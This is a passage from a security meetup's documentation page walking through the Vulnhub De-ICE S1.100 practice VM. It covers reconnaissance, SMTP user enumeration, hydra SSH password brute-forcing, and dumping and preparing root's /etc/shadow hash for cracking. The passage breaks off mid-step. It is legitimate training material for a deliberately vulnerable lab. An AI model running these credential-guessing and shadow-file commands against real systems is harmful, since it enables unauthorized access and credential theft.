

<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <title>3.8. De-ICE Level 1 &mdash; South Bay WASP 1.0.2 documentation</title>
  

  
  
  
  

  

  
  
    

  

  
  
    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
  

  

  
        <link rel="index" title="Index"
              href="../genindex.html"/>
        <link rel="search" title="Search" href="../search.html"/>
    <link rel="top" title="South Bay WASP 1.0.2 documentation" href="../index.html"/>
        <link rel="up" title="3. Pentest Challenges" href="../pentest_challenges.html"/>
        <link rel="next" title="3.9. Underdist: 3" href="underdist3.html"/>
        <link rel="prev" title="3.7. De-ICE Level 2" href="de-ice2.html"/> 

  
  <script src="../_static/js/modernizr.min.js"></script>

</head>

<body class="wy-body-for-nav" role="document">

   
  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search">
          

          
            <a href="../index.html" class="icon icon-home"> South Bay WASP
          

          
          </a>

          
            
            
              <div class="version">
                1.0
              </div>
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
              
            
            
              <p class="caption"><span class="caption-text">Table of Contents</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="VWADP.html">3.1. Finding and running challenges</a></li>
<li class="toctree-l2"><a class="reference internal" href="owlnest.html">3.2. OwlNest</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice6.html">3.3. De-ICE Level 6</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice5.html">3.4. De-ICE Level 5</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice4.html">3.5. De-ICE Level 4</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice3.html">3.6. De-ICE Level 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice2.html">3.7. De-ICE Level 2</a></li>
<li class="toctree-l2 current"><a class="current reference internal" href="#">3.8. De-ICE Level 1</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#setup">3.8.1. Setup</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#setting-up-the-vm">3.8.1.1. Setting up the VM</a></li>
<li class="toctree-l4"><a class="reference internal" href="#setting-up-your-environment">3.8.1.2. Setting up your environment</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#reconnaisance">3.8.2. Reconnaisance</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#network-reconnaissance">3.8.2.1. Network reconnaissance</a></li>
<li class="toctree-l4"><a class="reference internal" href="#port-80-reconnaissance-via-dirb-nikto">3.8.2.2. Port 80 reconnaissance via dirb &amp; nikto</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#the-exploit">3.8.3. The Exploit</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#guessing-passwords-to-get-logged-in">3.8.3.1. Guessing passwords to get logged in</a></li>
<li class="toctree-l4"><a class="reference internal" href="#getting-a-user-id-with-privileges">3.8.3.2. Getting a user id with privileges</a></li>
<li class="toctree-l4"><a class="reference internal" href="#cracking-root-in-etc-shadow">3.8.3.3. Cracking root in <code class="file docutils literal"><span class="pre">/etc/shadow</span></code></a></li>
<li class="toctree-l4"><a class="reference internal" href="#getting-the-ceo-s-bank-account-information">3.8.3.4. Getting the CEO’s bank account information</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="underdist3.html">3.9. Underdist: 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix5.html">3.10. Kioptrix Level 5</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix4.html">3.11. Kioptrix Level 4</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix3.html">3.12. Kioptrix Level 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix2.html">3.13. Kioptrix Level 2</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix1.html">3.14. Kioptrix Level 1</a></li>
<li class="toctree-l2"><a class="reference internal" href="security_shepherd.html">3.15. Security Shepherd Web App Levels</a></li>
<li class="toctree-l2"><a class="reference internal" href="holynix2.html">3.16. Holynix2</a></li>
<li class="toctree-l2"><a class="reference internal" href="holynix1.html">3.17. Holynix1</a></li>
<li class="toctree-l2"><a class="reference internal" href="freshly.html">3.18. Freshly</a></li>
<li class="toctree-l2"><a class="reference internal" href="zorz.html">3.19. ZorZ</a></li>
<li class="toctree-l2"><a class="reference internal" href="vulnix.html">3.20. Vulnix</a></li>
<li class="toctree-l2"><a class="reference internal" href="googles_xss_game.html">3.21. Google’s XSS Game</a></li>
<li class="toctree-l2"><a class="reference internal" href="owning_database_with_sqlmap.html">3.22. Owning the Database with SQLMap</a></li>
<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell_II.html">3.23. PentesterLab From SQL injection to Shell II</a></li>
<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell.html">3.24. PentesterLab From SQL injection to Shell</a></li>
<li class="toctree-l2"><a class="reference internal" href="skytower1.html">3.25. SkyTower1</a></li>
<li class="toctree-l2"><a class="reference internal" href="nebula.html">3.26. Exploit Exercises Nebula</a></li>
<li class="toctree-l2"><a class="reference internal" href="natas.html">3.27. Natas</a></li>
<li class="toctree-l2"><a class="reference internal" href="try2hack.nl.html">3.28. try2hack.nl</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
</ul>

            
          
        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
        
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">South Bay WASP</a>
        
      </nav>


      
      <div class="wy-nav-content">
        <div class="rst-content">
          















<div role="navigation" aria-label="breadcrumbs navigation">

  <ul class="wy-breadcrumbs">
    
      <li><a href="../index.html">Docs</a> &raquo;</li>
        
          <li><a href="../pentest_challenges.html">3. Pentest Challenges</a> &raquo;</li>
        
      <li>3.8. De-ICE Level 1</li>
    
    
      <li class="wy-breadcrumbs-aside">
        
            
            <a href="../_sources/challenges/de-ice1.rst.txt" rel="nofollow"> View page source</a>
          
        
      </li>
    
  </ul>

  
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="section" id="de-ice-level-1">
<span id="de-ice1"></span><h1>3.8. De-ICE Level 1<a class="headerlink" href="#de-ice-level-1" title="Permalink to this headline">¶</a></h1>
<div class="section" id="setup">
<h2>3.8.1. Setup<a class="headerlink" href="#setup" title="Permalink to this headline">¶</a></h2>
<p>This is to document the meetup’s efforts responding to the challenge <a class="reference external" href="https://www.vulnhub.com/entry/de-ice-s1100,8/">Vulnhub De-ICE: S1.100</a>, the first of the Vulnhub De-ICE series. This is a challenge to get the CEO’s bank account information.</p>
<div class="section" id="setting-up-the-vm">
<h3>3.8.1.1. Setting up the VM<a class="headerlink" href="#setting-up-the-vm" title="Permalink to this headline">¶</a></h3>
<p>The VM comes packaged as the live ISO <a class="reference external" href="https://www.vulnhub.com/entry/de-ice-s1100,8/#download">De-ICE_S1.100.iso</a> running SLAX 5.1.7 (based on Slackware 10.2.0). It uses the fixed IP 192.168.1.100; to force it to use DHCP on your local network, change the 192.168.1.100 network card to be a local network on your VM server (no network access) and add another ethernet interface that will pick up a DHCP address.</p>
</div>
<div class="section" id="setting-up-your-environment">
<h3>3.8.1.2. Setting up your environment<a class="headerlink" href="#setting-up-your-environment" title="Permalink to this headline">¶</a></h3>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice1
mkdir -p <span class="nv">$PT</span>
<span class="nb">cd</span> <span class="nv">$PT</span>
<span class="c1"># download de-ice1_setup.sh</span>
curl --silent --remote-name https://pentest-meetup.appspot.com/html/_downloads/de-ice1_setup.sh
<span class="c1"># edit as needed; later the recon will give you TARGET IP</span>
<span class="nb">source</span> de-ice1_setup.sh
</pre></div>
</div>
<p>The source for <code class="file docutils literal"><span class="pre">de-ice1_setup.sh</span></code> (<a class="reference download internal" href="../_downloads/de-ice1_setup.sh" download=""><code class="xref download docutils literal"><span class="pre">de-ice1_setup.sh</span></code></a>) should look something like the following.</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env bash</span>

<span class="c1"># *******************************************************</span>
<span class="c1"># Edit these to match your setup</span>
<span class="c1"># *******************************************************</span>
<span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.100          <span class="c1"># ip of de-ice1</span>
<span class="nv">SUBNET</span><span class="o">=</span><span class="m">192</span>.168.1.0/24         <span class="c1"># subnet</span>
<span class="nv">KALI</span><span class="o">=</span><span class="m">192</span>.168.1.28             <span class="c1"># Kali IP</span>
<span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice1      <span class="c1"># create working directories here</span>

<span class="o">[[</span> <span class="k">$(</span>grep -c de-ice1 /etc/hosts<span class="k">)</span> -eq <span class="m">0</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="se">\</span>
  <span class="nb">echo</span> <span class="s2">&quot; add \&quot;</span><span class="nv">$TARGET</span><span class="s2"> de-ice1.com\&quot; to /etc/hosts&quot;</span>

<span class="c1"># *******************************************************</span>
<span class="c1"># Maybe edit these</span>
<span class="c1"># *******************************************************</span>
<span class="c1"># Create some directories</span>
<span class="nv">TOOLS</span><span class="o">=</span>exploit,nmap,spider
<span class="nb">eval</span> mkdir -p <span class="nv">$PT</span>/<span class="o">{</span><span class="nv">$TOOLS</span><span class="o">}</span>
<span class="nv">TARGETS</span><span class="o">=</span>targets.txt

<span class="c1"># *******************************************************</span>
<span class="c1"># Don&#39;t edit these</span>
<span class="c1"># *******************************************************</span>
<span class="nv">HOST</span><span class="o">=</span>de-ice1.com
<span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
<span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="reconnaisance">
<h2>3.8.2. Reconnaisance<a class="headerlink" href="#reconnaisance" title="Permalink to this headline">¶</a></h2>
<div class="section" id="network-reconnaissance">
<h3>3.8.2.1. Network reconnaissance<a class="headerlink" href="#network-reconnaissance" title="Permalink to this headline">¶</a></h3>
<p>Start with some standard network reconnaissance looking for the vulnerable host:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice1
<span class="nb">source</span> <span class="nv">$PT</span>/de-ice1_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/nmap

<span class="nv">$SUDO</span> nmap -sn -PE -oA nmap_sn <span class="nv">$SUBNET</span>
<span class="nv">$SUDO</span> chown <span class="nv">$USER</span>.<span class="nv">$USER</span> nmap_sn.*
<span class="c1"># use the grep-able output to get a list of target hosts</span>
grep Up nmap_sn.gnmap <span class="p">|</span> cut -d<span class="s2">&quot; &quot;</span> -f2 &gt; <span class="nv">$TARGETS</span>
<span class="c1"># use the xml output to get an html report</span>
xsltproc nmap_sn.xml -o nmap_sn.html
</pre></div>
</div>
<p>Here we know $TARGET and can fill it in $PT/de-ice1_setup.sh and also edit <code class="file docutils literal"><span class="pre">/etc/hosts</span></code> to add “de-ice1.com” (<code class="docutils literal"><span class="pre">echo</span> <span class="pre">&quot;$TARGET</span> <span class="pre">de-ice1.com&quot;</span> <span class="pre">|</span> <span class="pre">$SUDO</span> <span class="pre">tee</span> <span class="pre">-a</span> <span class="pre">/etc/hosts</span></code>).</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice1
<span class="nb">source</span> <span class="nv">$PT</span>/de-ice1_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/nmap

<span class="nv">$SUDO</span> nmap -A -vv -T3 --max-retries <span class="m">5</span> -Pn -oA nmap_A <span class="nv">$TARGET</span>
<span class="nv">$SUDO</span> chown <span class="nv">$USER</span>.<span class="nv">$USER</span> nmap_A.*
xsltproc nmap_A.xml -o nmap_A.html
</pre></div>
</div>
<p>Running this reveals:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">20/tcp  closed ftp-data</span>
</span><span class="hll"><span class="go">21/tcp  open   ftp      vsftpd (broken: could not bind listening IPv4 socket)</span>
</span><span class="hll"><span class="go">22/tcp  open   ssh      OpenSSH 4.3 (protocol 1.99)</span>
</span><span class="go">|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)</span>
<span class="go">|_sshv1: Server supports SSHv1</span>
<span class="hll"><span class="go">25/tcp  open   smtp     Sendmail 8.13.7/8.13.7</span>
</span><span class="go">| smtp-commands: slax.example.net Hello [192.168.1.28], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, 8BITMIME, SIZE, DSN, ETRN, AUTH DIGEST-MD5 CRAM-MD5, DELIVERBY, HELP,</span>
<span class="go">|_ 2.0.0 This is sendmail version 8.13.7 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use &quot;HELP &lt;topic&gt;&quot;. 2.0.0 To report bugs in the implementation see 2.0.0 http://www.sendmail.org/email-addresses.html 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info</span>
<span class="hll"><span class="go">80/tcp  open   http     Apache httpd 2.0.55 ((Unix) PHP/5.1.2)</span>
</span><span class="go">|_http-methods: No Allow or Public header in OPTIONS response (status code 200)</span>
<span class="go">|_http-title: Site doesn&#39;t have a title (text/html).</span>
<span class="hll"><span class="go">110/tcp open   pop3     Openwall popa3d</span>
</span><span class="hll"><span class="go">143/tcp open   imap     UW imapd 2004.357</span>
</span><span class="go">|_imap-capabilities: LOGIN-REFERRALS AUTH=LOGINA0001 completed IMAP4REV1 MAILBOX-REFERRALS THREAD=ORDEREDSUBJECT STARTTLS CAPABILITY NAMESPACE OK BINARY IDLE LITERAL+ MULTIAPPEND UNSELECT THREAD=REFERENCES SORT SASL-IR SCAN</span>
<span class="go">443/tcp closed https</span>
<span class="go">MAC Address: 08:00:27:2A:6A:09 (Cadmus Computer Systems)</span>
<span class="go">Device type: general purpose</span>
<span class="go">Running: Linux 2.6.X</span>
<span class="go">OS CPE: cpe:/o:linux:linux_kernel:2.6</span>
<span class="go">OS details: Linux 2.6.13 - 2.6.32</span>
</pre></div>
</div>
</div>
<div class="section" id="port-80-reconnaissance-via-dirb-nikto">
<h3>3.8.2.2. Port 80 reconnaissance via dirb &amp; nikto<a class="headerlink" href="#port-80-reconnaissance-via-dirb-nikto" title="Permalink to this headline">¶</a></h3>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice1
<span class="nb">source</span> <span class="nv">$PT</span>/de-ice1_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/spider

nikto -output nikto.html -C all -host <span class="nv">$HOST</span> -port <span class="m">80</span>
dirb  http://<span class="nv">$HOST</span>/ -o dirb80.txt
</pre></div>
</div>
<p>No immediate remote exploits were available, but some web pages were identified for further reconnaissance.</p>
<div class="section" id="http-de-ice1-com-info-php-adds-more-software-versions">
<h4>3.8.2.2.1. <a class="reference external" href="http://de-ice1.com/info.php">http://de-ice1.com/info.php</a> adds more software versions<a class="headerlink" href="#http-de-ice1-com-info-php-adds-more-software-versions" title="Permalink to this headline">¶</a></h4>
<p>Exploring <a class="reference external" href="http://de-ice1.com/info.php">http://de-ice1.com/info.php</a> adds to our tally of software versions:   Linux slax 2.6.16 #95 Wed May 17 10:16:21 GMT 2006 i686; Apache/2.0.55 (Unix) with DOCUMENT_ROOT /var/www/htdocs and GATEWAY_INTERFACE CGI/1.1; PHP/5.1.2 with PHP API 20041225, PHP Extension 20050922; Zend Engine v2.1.0 with Zend Extension 220051025; OpenSSL 0.9.8a 11 Oct 2005; vsftpd; OpenSSH 4.3 (protocol 1.99); Sendmail 8.13.7/8.13.7; Openwall popa3d; and UW imapd 2004.357.</p>
<p>At this point none of these appeared to offer an easy remote exploit.</p>
</div>
<div class="section" id="http-de-ice1-com-index2-php-yields-user-id-candidates">
<h4>3.8.2.2.2. <a class="reference external" href="http://de-ice1.com/index2.php">http://de-ice1.com/index2.php</a> yields user id candidates<a class="headerlink" href="#http-de-ice1-com-index2-php-yields-user-id-candidates" title="Permalink to this headline">¶</a></h4>
<p>This web page offered up a list of email addresses which can be verified via <strong class="program">smtp-user-enum</strong>: <a class="reference external" href="mailto:marym&#37;&#52;&#48;herot&#46;net">marym<span>&#64;</span>herot<span>&#46;</span>net</a>, <a class="reference external" href="mailto:patrickp&#37;&#52;&#48;herot&#46;net">patrickp<span>&#64;</span>herot<span>&#46;</span>net</a>, <a class="reference external" href="mailto:thompsont&#37;&#52;&#48;herot&#46;net">thompsont<span>&#64;</span>herot<span>&#46;</span>net</a>, <a class="reference external" href="mailto:benedictb&#37;&#52;&#48;herot&#46;net">benedictb<span>&#64;</span>herot<span>&#46;</span>net</a>, <a class="reference external" href="mailto:genniege&#37;&#52;&#48;herot&#46;net">genniege<span>&#64;</span>herot<span>&#46;</span>net</a>, <a class="reference external" href="mailto:michaelp&#37;&#52;&#48;herot&#46;net">michaelp<span>&#64;</span>herot<span>&#46;</span>net</a>, <a class="reference external" href="mailto:longe&#37;&#52;&#48;herot&#46;net">longe<span>&#64;</span>herot<span>&#46;</span>net</a>, <a class="reference external" href="mailto:adamsa&#37;&#52;&#48;herot&#46;net">adamsa<span>&#64;</span>herot<span>&#46;</span>net</a>, <a class="reference external" href="mailto:banterb&#37;&#52;&#48;herot&#46;net">banterb<span>&#64;</span>herot<span>&#46;</span>net</a>, and <a class="reference external" href="mailto:coffeec&#37;&#52;&#48;herot&#46;net">coffeec<span>&#64;</span>herot<span>&#46;</span>net</a>. This can lead to user id guesses.</p>
<p><strong class="program">smtp-user-enum</strong> offers 3 three options for checking users: “-M VRFY”, “-M EXPN”, and “-M RCPT”. You should run your user list plus an account you’re nearly certain should exist, and an account that shouldn’t exist. In this challenge, VRFY indicates all the accounts exist (they don’t), EXPN says none do (some do), and RCPT actually indicates only 4 exist (which is the right answer when including root).</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice1
<span class="nb">source</span> <span class="nv">$PT</span>/de-ice1_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/exploit
<span class="hll"><span class="nv">U</span><span class="o">=</span><span class="s2">&quot;marie,mary pat,patrick terry,thompson ben,benedict erin,gennieg paul,michael ester,long adam,adams bob,banter chad,coffee&quot;</span>
</span><span class="k">for</span> u in <span class="nv">$U</span><span class="p">;</span> <span class="k">do</span>
  <span class="nv">FN</span><span class="o">=</span><span class="si">${</span><span class="nv">u</span><span class="p">%,*</span><span class="si">}</span>
  <span class="nv">LN</span><span class="o">=</span><span class="si">${</span><span class="nv">u</span><span class="p">#*,</span><span class="si">}</span>
  <span class="nv">FI</span><span class="o">=</span><span class="si">${</span><span class="nv">FN</span><span class="p">:</span><span class="nv">0</span><span class="p">:</span><span class="nv">1</span><span class="si">}</span>
  <span class="nv">LI</span><span class="o">=</span><span class="si">${</span><span class="nv">LN</span><span class="p">:</span><span class="nv">0</span><span class="p">:</span><span class="nv">1</span><span class="si">}</span>
<span class="hll">  <span class="nb">echo</span> <span class="nv">$FN$LI</span>
</span><span class="hll">  <span class="nb">echo</span> <span class="nv">$FI$LN</span>
</span><span class="hll">  <span class="nb">echo</span> <span class="nv">$LN$FI</span>
</span><span class="hll">  <span class="nb">echo</span> <span class="nv">$LI$FN</span>
</span><span class="hll"><span class="k">done</span> &gt; users.txt
</span><span class="c1"># Add root to list</span>
<span class="hll"><span class="nb">echo</span> <span class="s2">&quot;root&quot;</span> &gt;&gt; users.txt
</span><span class="hll">
</span><span class="hll">smtp-user-enum -M VRFY -U users.txt -t de-ice1.com
</span><span class="c1"># results in all user ids exist</span>
smtp-user-enum -M EXPN -U users.txt -t de-ice1.com
<span class="c1"># results in no user ids exist</span>
smtp-user-enum -M RCPT -U users.txt -t de-ice1.com
<span class="c1"># results in aadams, bbanter, ccoffee, root exist</span>
</pre></div>
</div>
<p>So we guess there are 4 user accounts from this list: aadams, bbanter, ccoffee, root.</p>
</div>
</div>
</div>
<div class="section" id="the-exploit">
<h2>3.8.3. The Exploit<a class="headerlink" href="#the-exploit" title="Permalink to this headline">¶</a></h2>
<div class="section" id="guessing-passwords-to-get-logged-in">
<h3>3.8.3.1. Guessing passwords to get logged in<a class="headerlink" href="#guessing-passwords-to-get-logged-in" title="Permalink to this headline">¶</a></h3>
<p>Our first attempt is to check our candidate user id’s for exceptionally weak passwords (<strong class="program">hydra</strong>’s “-e nsr” option):</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice1
<span class="nb">source</span> <span class="nv">$PT</span>/de-ice1_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/exploit
<span class="hll">cat &gt; users.txt <span class="s">&lt;&lt;EOF</span>
</span><span class="s">aadams</span>
<span class="s">bbanter</span>
<span class="s">ccoffee</span>
<span class="s">root</span>
<span class="s">EOF</span>

<span class="hll">hydra -L users.txt -e nsr -t <span class="m">2</span> de-ice1.com ssh
</span><span class="hll"><span class="c1"># results in</span>
</span><span class="c1"># [22][ssh] host: de-ice1.com   login: bbanter   password: bbanter</span>
</pre></div>
</div>
<p>So user bbanter/bbanter allows some reconnaissance:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="hll">ssh bbanter@de-ice1.com    <span class="c1"># password bbanter</span>
</span><span class="hll">cat /etc/passwd
</span><span class="c1"># results show these user ids matching smtp-user-enum.</span>
<span class="c1"># root:x:0:0:DO NOT CHANGE PASSWORD - WILL BREAK FTP ENCRYPTION:/root:/bin/bash</span>
<span class="hll"><span class="c1"># aadams:x:1000:10:,,,:/home/aadams:/bin/bash</span>
</span><span class="c1"># bbanter:x:1001:100:,,,:/home/bbanter:/bin/bash</span>
<span class="c1"># ccoffee:x:1002:100:,,,:/home/ccoffee:/bin/bash</span>
<span class="hll">grep <span class="m">10</span> /etc/group
</span><span class="c1"># results show aadams group 10 is the wheel group</span>
<span class="hll"><span class="c1"># wheel::10:root</span>
</span><span class="hll">grep PermitRootLogin /etc/ssh/sshd_config
</span><span class="c1"># results show no ssh as root</span>
<span class="hll"><span class="c1"># PermitRootLogin no</span>
</span></pre></div>
</div>
<p>So user aadams is our target for SSH password cracking.</p>
</div>
<div class="section" id="getting-a-user-id-with-privileges">
<h3>3.8.3.2. Getting a user id with privileges<a class="headerlink" href="#getting-a-user-id-with-privileges" title="Permalink to this headline">¶</a></h3>
<p>We’re focused on the senior system admin Adam Adams with user id aadams. We’ll try online SSH password guessing with <strong class="program">hydra</strong>, starting with smaller password lists, graduating to larger ones as required. Our source of password lists can come from one of Kali’s <code class="file docutils literal"><span class="pre">/usr/share/wordlists/</span></code> but instead we’ll look at <a class="reference external" href="https://github.com/danielmiessler/SecLists/tree/master/Passwords">SecLists</a> and <a class="reference external" href="http://area51archives.com/index.php?title=Ultimate_Password_List">Ultimate Password List</a> and choose one of those. Of interest is the rockyou series, starting with shorter ones and graduating up until we met success with rockyou-75.txt (not the whole rockyou list but the largest sublist). Be wary of specifying too many parallel tasks: running this list with “-t 32” failed to find the password “nostradamus”, but running with “-t 4” worked (after a much longer search). If that the rockyou list didn’t work we’d try <code class="file docutils literal"><span class="pre">pw</span> <span class="pre">list</span> <span class="pre">3.txt</span></code> from the Ultimate Password List because it’s big enough without being too big.</p>
<p>Here we obtain the password lists:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice1
<span class="nb">source</span> <span class="nv">$PT</span>/de-ice1_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/exploit

<span class="hll">git clone https://github.com/danielmiessler/SecLists.git
</span><span class="hll">cp Passwords/rockyou-75.txt .
</span><span class="hll">curl --silent --remote-name http://area51archives.com/files/pass_list.rar
</span><span class="hll">unrar -e pass_list.rar
</span><span class="hll">cp pass_list/pw<span class="se">\ </span>list<span class="se">\ </span><span class="m">3</span>.txt .
</span></pre></div>
</div>
<p>Here we use them to get aadams password (nostradamus):</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice1
<span class="nb">source</span> <span class="nv">$PT</span>/de-ice1_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/exploit

<span class="hll"><span class="c1"># The following failed because of &quot;-t 32&quot; even though password was in list.</span>
</span><span class="hll"><span class="c1"># hydra -F -l aadams -P rockyou-75.txt -t 32  de-ice1.com ssh</span>
</span><span class="hll"><span class="c1"># So tried reducing &quot;-t 32&quot; to &quot;-t 4&quot; with success and longer run time.</span>
</span><span class="hll">hydra -V -F -l aadams -P rockyou-75.txt -t <span class="m">4</span>  de-ice1.com ssh
</span></pre></div>
</div>
<p>After <code class="docutils literal"><span class="pre">ssh</span> <span class="pre">aadams&#64;de-ice1.com</span></code>, <code class="docutils literal"><span class="pre">sudo</span> <span class="pre">-l</span></code> permissions reveal aadams can display root’s entry in <code class="file docutils literal"><span class="pre">/etc/shadow</span></code>:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="hll">sshpass -p <span class="s1">&#39;nostradamus&#39;</span> ssh aadams@de-ice1.com
</span><span class="hll">sudo -l
</span><span class="c1"># results in</span>
<span class="c1">#  User aadams may run the following commands on this host:</span>
<span class="c1">#    (root) NOEXEC: /bin/ls</span>
<span class="hll"><span class="c1">#    (root) NOEXEC: /usr/bin/cat</span>
</span><span class="c1">#    (root) NOEXEC: /usr/bin/more</span>
<span class="c1">#    (root) NOEXEC: !/usr/bin/su *root*</span>
</pre></div>
</div>
<p>So aadams can <code class="docutils literal"><span class="pre">cat</span> <span class="pre">/etc/shadow</span></code>.</p>
</div>
<div class="section" id="cracking-root-in-etc-shadow">
<h3>3.8.3.3. Cracking root in <code class="file docutils literal"><span class="pre">/etc/shadow</span></code><a class="headerlink" href="#cracking-root-in-etc-shadow" title="Permalink to this headline">¶</a></h3>
<p>On de-ice1.com run these commands as aadams:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span>cat /etc/passwd <span class="p">|</span> grep root <span class="p">|</span> tee pass.txt
sudo cat /etc/shadow <span class="p">|</span> grep root <span class="p">|</span> tee shadow.txt
</pre></div>
</div>
<p>Run the code below to create <code class="file docutils literal"><span class="pre">passwd.txt</span></code> and <code class="file docutils literal"><span class="pre">shadow.txt</span></code> with identical contents as de-ice1.com then <strong class="program">/usr/sbin/unshadow</strong> them:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice1
<span class="nb">source</span> <span class="nv">$PT</span>/de-ice1_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/exploit

<span class="hll"><span class="nv">SHADOW</span><span class="o">=</span><span class="s1">&#39;root:$1$TOi0HE5n$j3obHaAlUdMbHQnJ4Y5Dq0:13553:0:::::&#39;</span>
</span><span class="hll"><span class="nv">PASSWD</span><span class="o">=</span><span class="s1">&#39;root:x:0:0:DO NOT CHANGE PASSWORD - WILL BREAK FTP ENCRYPTION:/root:/bin/bash&#39;</span>
</span>
<span class="nb">echo</span> <span class="s2">&quot;</span><span class="nv">$SHADOW</span><span class="s2">&quot;</span> <span class="p">|</span> tee shadow.txt
